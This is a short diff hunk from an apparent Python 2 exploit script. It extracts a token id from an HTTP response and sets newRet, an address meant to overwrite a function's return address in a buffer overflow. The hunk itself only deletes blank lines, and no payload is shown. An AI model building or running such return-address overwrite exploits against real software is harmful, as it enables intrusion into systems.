@@ -36,9 +36,7 @@ for l in r.content.split('\n'):
         q2 = l.rfind('"')
         q1 = l[:q2].rfind('"')
         tokenid = l[q1+1:q2]
-
 print 'tokenid is %s' % tokenid
-
 
 # The return address will be overwritten as newRet (sample:0x0048fba8)
 newRet = '\xa8\xfb\x48\x00'
